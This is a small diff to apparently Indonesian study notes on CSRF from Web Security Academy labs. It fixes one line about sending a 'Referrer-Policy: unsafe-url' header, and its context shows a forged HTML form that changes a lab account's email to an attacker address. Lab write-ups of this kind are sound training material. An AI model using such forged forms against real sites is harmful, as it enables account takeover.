@@ -104,7 +104,7 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
   </script>
   ```
   ```
-  tambahkan "referrer-Policy: unsafe-url" pada repeater
+  tambahkan "referrer-Policy: unsafe-url" pada header
   
   <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="acun@hacker.site">
